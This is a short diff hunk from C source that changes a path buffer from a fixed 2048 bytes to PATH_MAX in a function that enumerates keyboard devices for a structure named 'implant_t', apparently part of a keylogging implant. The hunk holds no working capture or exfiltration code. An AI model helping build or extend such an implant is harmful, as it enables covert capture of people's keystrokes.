@@ -45,7 +45,7 @@ is_kbd(const struct dirent *f) {
 
 uint8_t fetch_available_keyboards(implant_t *instance) {
 
-    char rpath[2048] = {0};
+    char rpath[PATH_MAX] = {0};
     struct dirent **char_devices = NULL;
     int possible_paths = 0;
 
